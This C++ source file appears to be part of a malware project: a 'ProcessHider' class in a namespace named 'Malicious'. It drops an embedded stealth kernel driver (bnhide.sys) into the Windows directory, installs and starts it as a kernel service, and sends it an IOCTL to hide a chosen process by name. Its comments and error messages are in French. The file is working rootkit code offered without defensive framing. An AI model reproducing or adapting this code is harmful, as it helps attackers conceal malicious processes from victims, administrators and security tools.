#include "ProcessHider.hpp"
#include "StealthDriver.hpp"
#include "BinaryRessource.hpp"
#include <system/System.hpp>
#include <common/Log.hpp>

#ifdef  _WIN32_IE
#undef _WIN32_IE
#endif
#define _WIN32_IE 0x0501

#define SYS_DRIVER_FILENAME "bnhide.sys"
#define IOCTL_NAME_PRCSS CTL_CODE(40000, 0x900, METHOD_BUFFERED, FILE_ANY_ACCESS)
enum {MAXLEN_NAME=30};
char sznamesys[] = "bnhide";

namespace Malicious
{
    typedef struct _DATA_SURVEY
    {
        unsigned long len;
        wchar_t name[MAXLEN_NAME];
    } DATA_SURVEY, *PDATA_SURVEY;
    
    ProcessHider::DriverError::DriverError(const std::string& argMsgError)
		: Exception(argMsgError)
    {
        LOG_LAST_ERROR();
		LOG << argMsgError;
    }

    ProcessHider::ProcessHider()
    {
		LOG_THIS_FUNCTION
		std::string windownPath;
		System::getWindowsPath(windownPath);
        driverPath = windownPath + "\\" + SYS_DRIVER_FILENAME;
        
        BinaryRessource driver(StealthDriver, sizeof(StealthDriver), driverPath, true);
        
        openServiceManager();
        startService();
        closeService();
        closeServiceManager();
    }

    ProcessHider::~ProcessHider()
    {
		LOG_THIS_FUNCTION
        closeService();
        closeServiceManager();
    }

    void ProcessHider::hide(const std::string& processName)
    {
		LOG_THIS_FUNCTION
        HANDLE hdev = CreateFile("\\\\.\\bnhide", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
        if(hdev == INVALID_HANDLE_VALUE)
        {
            throw DriverError("Impossible de creer le fichier peripherique pour le driver.");
        }

        DATA_SURVEY dts;
        char szname[MAXLEN_NAME + 4];
        strncpy(szname, processName.c_str(), MAXLEN_NAME);
        dts.len = processName.size();

        if(dts.len)
        {
            WCHAR name[MAXLEN_NAME + 1];
            MultiByteToWideChar(CP_ACP, MB_PRECOMPOSED, szname, -1, name, MAXLEN_NAME + 1);
            memcpy(dts.name, name, dts.len * 2);
        }

        DWORD d = 0;
        BOOL b = DeviceIoControl(hdev, (DWORD) IOCTL_NAME_PRCSS, &dts, sizeof(DATA_SURVEY), 0, 0, &d, 0);
        CloseHandle(hdev);

        if(!b)
        {
			throw DriverError("Impossible de commander le driver.");
        }
    }

    void ProcessHider::remove()
    {
		LOG_THIS_FUNCTION
        openServiceManager();
        openService();
        stopService();
        closeService();
        closeServiceManager();
    }

    void ProcessHider::openServiceManager()
    {
		LOG_THIS_FUNCTION
        manager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
        if(!manager)
        {
            throw DriverError("Impossible d'ouvrir le service manager.");
        }
    }
    
    void ProcessHider::closeServiceManager()
    {
		LOG_THIS_FUNCTION
        CloseServiceHandle(manager);
    }

    void ProcessHider::openService()
    {
		LOG_THIS_FUNCTION
        service = OpenService(manager, sznamesys, SERVICE_ALL_ACCESS);
        if(!service)
        {
            throw DriverError("Impossible d'ouvrir le service.");
        }
    }

    void ProcessHider::closeService()
    {
		LOG_THIS_FUNCTION
        CloseServiceHandle(service);
    }

    void ProcessHider::startService()
    {
		LOG_THIS_FUNCTION
        service = CreateService(
			manager, 
			sznamesys,
			sznamesys,
            SERVICE_ALL_ACCESS,
			SERVICE_KERNEL_DRIVER,
            SERVICE_DEMAND_START, 
			SERVICE_ERROR_CRITICAL, //SERVICE_ERROR_NORMAL, 
			driverPath.c_str(),
            NULL, NULL, NULL, NULL, NULL);
        if(!service)
        {
			DWORD lastError = GetLastError();
            if(lastError == ERROR_SERVICE_EXISTS)
            {
                LOG << "Le service existe deja.";
                openService();
            }
            else 
            {
                throw DriverError("Impossible de creer le service.");
            }
        }
        if(!StartService(service, 0, 0))
        {
            throw DriverError("Impossible de demarrer le serice.");
        }
    }

    void ProcessHider::stopService()
    {
		LOG_THIS_FUNCTION
        SERVICE_STATUS status;
        ControlService(service, SERVICE_CONTROL_STOP, &status);
        if(!DeleteService(service)) 
        {
            throw DriverError("Impossible de stopper le service.");
        }
    }
} // Malicious


